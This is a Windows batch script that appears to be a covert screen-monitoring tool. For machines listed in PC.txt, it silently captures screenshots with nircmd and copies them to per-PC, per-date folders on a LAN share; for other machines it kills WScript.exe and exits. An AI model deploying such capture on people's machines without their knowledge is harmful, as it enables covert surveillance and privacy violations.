@echo on
chcp 866
cd "%~dp0"
net use \\192.168.0.XXX\share /persistent:yes
Set CURDATE=%date%
Set CURTIME=%time%
Set PCNAME=%COMPUTERNAME%
Set FOLDER=\\192.168.0.XXX\share\IFile
if not exist "%FOLDER%\" mkdir "%FOLDER%\"
for /F "usebackq delims=" %%A in ("%FOLDER%\PC.txt") do (
    if /I "%%A"=="%PCNAME%" (
        goto m
    )
)
taskkill /F /T /IM WScript.exe
exit
:m
if not exist "%FOLDER%\%PCNAME%" mkdir "%FOLDER%\%PCNAME%"
if not exist "%FOLDER%\%PCNAME%\%CURDATE%" mkdir "%FOLDER%\%PCNAME%\%CURDATE%"
Set NAMEFILE=%CURDATE%_%CURTIME:~0,2%-%CURTIME:~3,2%-%CURTIME:~6,2%
%~dp0\nircmd.exe savescreenshot "%tmp%\%NAMEFILE%"
TIMEOUT /T 1
move "%tmp%\%NAMEFILE%" "%FOLDER%\%PCNAME%\%CURDATE%\%NAMEFILE%.png"
